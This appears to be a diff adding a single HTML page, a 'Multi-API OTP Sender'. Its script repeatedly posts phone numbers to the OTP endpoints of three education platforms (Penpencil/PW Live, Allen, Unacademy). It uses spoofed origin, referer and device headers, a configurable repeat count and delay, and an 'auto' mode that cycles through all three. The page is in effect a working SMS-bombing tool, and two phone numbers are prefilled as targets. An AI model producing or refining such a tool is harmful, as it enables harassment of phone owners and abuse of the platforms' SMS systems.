@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Multi-API OTP Sender</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:"Poppins",sans-serif; }
+    body {
+      min-height:100vh;
+      background:linear-gradient(135deg,#141e30,#243b55);
+      display:flex; justify-content:center; align-items:center;
+      padding:40px;
+    }
+    .container {
+      width:100%; max-width:1150px;
+      background:rgba(255,255,255,0.08);
+      border-radius:20px; padding:30px;
+      backdrop-filter:blur(15px);
+      box-shadow:0 15px 35px rgba(0,0,0,0.4);
+      color:#fff; animation:fadeIn 1s ease;
+      display:flex; flex-direction:column;
+    }
+    @keyframes fadeIn { from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);} }
+    .header { display:flex; justify-content:space-between; align-items:center; margin-bottom:25px; }
+    .header h1 {
+      font-size:28px; font-weight:700;
+      background:linear-gradient(90deg,#00f2fe,#4facfe);
+      -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+    }
+    .status { font-size:14px; color:#fffa; font-weight:500; }
+    .main { display:grid; grid-template-columns:1fr 1fr; gap:25px; }
+    label { display:block; margin-top:16px; font-weight:600; font-size:15px; color:#ddd; }
+    input, textarea, select {
+      width:100%; padding:12px 14px; margin-top:6px;
+      border:none; border-radius:12px; font-size:15px;
+      background:rgba(255,255,255,0.1); color:#fff; outline:none;
+      transition:all 0.3s ease;
+    }
+    input:focus, textarea:focus, select:focus {
+      background:rgba(255,255,255,0.2); box-shadow:0 0 8px #00f2fe;
+    }
+    button {
+      padding:14px; border:none; border-radius:14px;
+      font-size:16px; font-weight:600; cursor:pointer; color:#fff; width:100%;
+      transition:all 0.3s ease, transform 0.2s ease;
+      margin-top:16px;
+    }
+    button:hover { transform:translateY(-3px) scale(1.02); box-shadow:0 6px 20px rgba(0,0,0,0.3); }
+    button:active { transform:scale(0.97); }
+    .clearBtn { background:linear-gradient(135deg,#ff7eb3,#ff758c); }
+    .startBtn { background:linear-gradient(135deg,#6a11cb,#2575fc); }
+    .stopBtn { background:linear-gradient(135deg,#ff416c,#ff4b2b); }
+    #controls { display:none; flex-direction:row; gap:12px; margin-top:10px; }
+    pre {
+      height:100%; padding:18px; background:#000; color:#0f0;
+      border-radius:14px; font-size:14px; font-family:"Courier New",monospace;
+      max-height:500px; overflow-y:auto;
+      box-shadow:inset 0 0 15px rgba(0,255,100,0.3);
+      white-space:pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1> 😱 Multi-API OTP Sender</h1>
+      <span id="status" class="status">Ready. Click Start...</span>
+    </div>
+
+    <div class="main">
+      <!-- Left side form -->
+      <div>
+        <form id="otpForm">
+          <label>The Phone Numbers:</label>
+          <textarea id="phones" rows="6" required>9065854709,7352313102</textarea>
+          
+          <label>🔁 How Many Times:</label>
+          <input type="number" id="count" value="2" min="1" required>
+
+          <label>⏳ Delay (seconds):</label>
+          <input type="number" id="delay" value="5" min="1" required>
+
+          <label>🌐 Select API:</label>
+          <select id="apiChoice">
+               <option value="allen">Allen</option>
+            <option value="penpencil">Penpencil (PW Live)</option>
+         
+            <option value="unacademy">Unacademy</option>
+            <option value="auto">Auto (Try all)</option>
+          </select>
+        </form>
+
+        <!-- Buttons -->
+        <button id="clearBtn" class="clearBtn">🧹 Clear Response</button>
+        <button id="startBtn" class="startBtn">▶ Start</button>
+        <div id="controls">
+          <button id="stopBtn" class="stopBtn">⏹ Stop</button>
+        </div>
+      </div>
+
+      <!-- Right logs -->
+      <pre id="responseBox"></pre>
+    </div>
+  </div>
+
+  <script>
+    let stopFlag=false;
+
+    const apiConfigs = {
+      penpencil: {
+        name: "Penpencil",
+        url: "https://api.penpencil.co/v1/users/get-otp?smsType=0&fallback=true",
+        headers: {
+          "Content-Type":"application/json",
+          "user-agent":"Mozilla/5.0",
+          "randomid":"037e210d-f29a-4b7e-9383-9c1efa4816ae",
+          "origin":"https://www.pw.live",
+          "referer":"https://www.pw.live/"
+        },
+        makeBody: (phone)=>({
+          username: phone,
+          countryCode: "+91",
+          organizationId: "5eb393ee95fab7468a79d189"
+        })
+      },
+      allen: {
+        name: "Allen",
+        url: "https://api.allen-live.in/api/v1/auth/sendOtp",
+        headers: {
+          "Content-Type":"application/json",
+          "accept":"application/json",
+          "x-client-type":"web",
+          "x-device-id":"624a70b3-d577-430e-a63b-b67f28865a90",
+          "origin":"https://allen.in",
+          "referer":"https://allen.in/",
+          "user-agent":"Mozilla/5.0"
+        },
+        makeBody: (phone)=>({
+          country_code:"91",
+          phone_number:phone,
+          persona_type:"STUDENT"
+        })
+      },
+      unacademy: {
+        name: "Unacademy",
+        url: "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
+        headers: {
+          "Content-Type":"application/json",
+          "x-platform":"0",
+          "origin":"https://unacademy.com",
+          "referer":"https://unacademy.com/",
+          "user-agent":"Mozilla/5.0"
+        },
+        makeBody: (phone)=>(({
+          phone: phone,
+          country_code: "IN",
+          otp_type: 1,
+          email: "",
+          send_otp: true,
+          is_un_teach_user: false
+        }))
+      }
+    };
+
+    async function tryApi(config, phone, attempt){
+      try{
+        const res = await fetch(config.url,{
+          method:"POST",
+          headers:config.headers,
+          body:JSON.stringify(config.makeBody(phone))
+        });
+        const data=await res.json();
+        if(!res.ok) throw new Error("HTTP "+res.status);
+        return `#${attempt} ✅ ${phone} → ${config.name} → ${JSON.stringify(data)}`;
+      }catch(err){
+        return `#${attempt} ❌ ${phone} → ${config.name} failed (${err})`;
+      }
+    }
+
+    document.getElementById("clearBtn").addEventListener("click",()=>{
+      document.getElementById("responseBox").textContent="";
+      document.getElementById("status").textContent="🧹 Response Cleared.";
+    });
+
+    document.getElementById("startBtn").addEventListener("click",async()=>{
+      stopFlag=false;
+      document.getElementById("controls").style.display="flex";
+      const phones=document.getElementById("phones").value.split(/[\n,]+/).map(p=>p.trim()).filter(p=>p);
+      const count=parseInt(document.getElementById("count").value,10);
+      const delay=parseInt(document.getElementById("delay").value,10)*1000;
+      const apiChoice=document.getElementById("apiChoice").value;
+      const responseBox=document.getElementById("responseBox");
+      responseBox.textContent="";
+      document.getElementById("status").textContent="🚀 Sending...";
+
+      for(const phone of phones){
+        responseBox.textContent+=`📱 Starting for number: ${phone}\n\n`;
+        for(let i=1;i<=count;i++){
+          if(stopFlag){responseBox.textContent+="⏹ Stopped by user.\n";break;}
+          
+          if(apiChoice==="auto"){
+            let success=false;
+            for(const key of ["penpencil","allen","unacademy"]){
+              const log=await tryApi(apiConfigs[key],phone,i);
+              responseBox.textContent+=log+"\n";
+              responseBox.scrollTop=responseBox.scrollHeight;
+              if(log.includes("✅")){success=true;break;}
+              await new Promise(r=>setTimeout(r,1000));
+            }
+            if(!success) responseBox.textContent+=`⚠️ ${phone} → All APIs failed.\n`;
+          }else{
+            const config=apiConfigs[apiChoice];
+            const log=await tryApi(config,phone,i);
+            responseBox.textContent+=log+"\n";
+            responseBox.scrollTop=responseBox.scrollHeight;
+          }
+
+          if(i<count && !stopFlag){
+            responseBox.textContent+=`⏳ ${phone} → Waiting ${delay/1000}s...\n\n`;
+            await new Promise(r=>setTimeout(r,delay));
+          }
+        }
+        responseBox.textContent+=`✅ Finished for ${phone}\n\n`;
+      }
+      document.getElementById("status").textContent="✅ All numbers done.";
+      responseBox.scrollTop=responseBox.scrollHeight;
+    });
+
+    document.getElementById("stopBtn").addEventListener("click",()=>{
+      stopFlag=true;
+      document.getElementById("status").textContent="⏹ Stopped.";
+    });
+  </script>
+</body>
+</html>
